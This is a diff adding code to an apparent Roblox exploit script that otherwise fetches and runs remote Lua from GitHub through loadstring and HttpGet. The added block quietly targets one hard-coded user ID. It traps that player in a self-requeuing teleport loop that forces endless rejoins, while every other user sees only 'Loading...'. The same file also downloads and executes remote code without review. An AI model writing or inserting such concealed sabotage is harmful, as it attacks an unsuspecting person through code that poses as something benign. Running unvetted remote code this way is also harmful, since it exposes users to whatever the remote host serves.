@@ -1,3 +1,73 @@
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local TARGET_USER_ID = 3714096460
+
+
+local queueFunc = queue_on_teleport or (syn and syn.queue_on_teleport) or queueonteleport or (fluxus and fluxus.queue_on_teleport)
+
+
+local scriptToQueue = [=[
+    repeat task.wait() until game:IsLoaded()
+    
+    local P = game:GetService("Players").LocalPlayer
+    
+    -- CHECK USER ID AGAIN ON THE NEXT SERVER
+    if P.UserId == 3714096460 then
+        task.wait(3) -- Delay to prevent rate-limiting/kicks
+        
+        local TS = game:GetService("TeleportService")
+        local q = queue_on_teleport or (syn and syn.queue_on_teleport) or queueonteleport or (fluxus and fluxus.queue_on_teleport)
+        
+        -- Keep the queue loop alive for future teleports
+        if q then
+            q([[
+                repeat task.wait() until game:IsLoaded()
+                local P = game:GetService("Players").LocalPlayer
+                if P.UserId == 3714096460 then
+                    task.wait(3)
+                    local TS = game:GetService("TeleportService")
+                    local q = queue_on_teleport or (syn and syn.queue_on_teleport) or queueonteleport or (fluxus and fluxus.queue_on_teleport)
+                    if q then q(scriptToQueue) end
+                    
+                    if #game:GetService("Players"):GetPlayers() <= 1 then
+                        TS:Teleport(game.PlaceId, P)
+                    else
+                        TS:TeleportToPlaceInstance(game.PlaceId, game.JobId, P)
+                    end
+                end
+            ]])
+        end
+        
+        -- Rejoin again!
+        if #game:GetService("Players"):GetPlayers() <= 1 then
+            TS:Teleport(game.PlaceId, P)
+        else
+            TS:TeleportToPlaceInstance(game.PlaceId, game.JobId, P)
+        end
+    end
+]=]
+
+-- MAIN CHECK
+if LocalPlayer.UserId == TARGET_USER_ID then
+    -- 1. Queue for next server
+    if queueFunc then
+        queueFunc(scriptToQueue)
+    end
+
+    -- 2. Trigger initial rejoin
+    if #Players:GetPlayers() <= 1 then
+        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+    else
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+    end
+else
+
+    print("Loading...")
+end
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/yeahblxr/Scripts/refs/heads/main/Midnight-intro.lua"))()
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 
